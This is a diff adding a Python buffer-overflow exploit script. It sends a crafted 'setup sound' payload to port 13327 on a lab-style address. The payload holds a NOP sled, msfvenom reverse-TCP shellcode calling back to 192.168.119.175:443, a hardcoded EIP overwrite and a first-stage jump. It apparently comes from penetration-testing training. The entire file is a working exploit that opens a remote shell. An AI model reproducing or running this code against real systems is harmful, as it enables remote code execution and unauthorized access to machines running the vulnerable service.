@@ -1,0 +1,32 @@
+#!/usr/bin/python 
+import socket
+
+host = "192.168.175.44"
+
+nop_sled = "\x90" * 8
+
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.175 LPORT=443 -b "\x00\x20" -f py -v shellcode
+shellcode = b""
+shellcode += b"\xba\xc0\xba\x28\x8b\xdb\xd9\xd9\x74\x24\xf4"
+shellcode += b"\x5b\x29\xc9\xb1\x12\x83\xc3\x04\x31\x53\x0e"
+shellcode += b"\x03\x93\xb4\xca\x7e\x22\x12\xfd\x62\x17\xe7"
+shellcode += b"\x51\x0f\x95\x6e\xb4\x7f\xff\xbd\xb7\x13\xa6"
+shellcode += b"\x8d\x87\xde\xd8\xa7\x8e\x19\xb0\xf7\xd9\xad"
+shellcode += b"\xef\x90\x1b\x52\xee\xdb\x95\xb3\x40\x7d\xf6"
+shellcode += b"\x62\xf3\x31\xf5\x0d\x12\xf8\x7a\x5f\xbc\x6d"
+shellcode += b"\x54\x13\x54\x1a\x85\xfc\xc6\xb3\x50\xe1\x54"
+shellcode += b"\x17\xea\x07\xe8\x9c\x21\x47"
+
+padding = nop_sled + shellcode + "\x41" * (4368 - 95 - 8) 
+
+eip = "\x96\x45\x13\x08"
+
+first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
+buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+print "[*]Sending evil buffer..."
+s.connect((host, 13327))
+print s.recv(1024)
+s.send(buffer)
+s.close()
+print "[*]Payload Sent !"
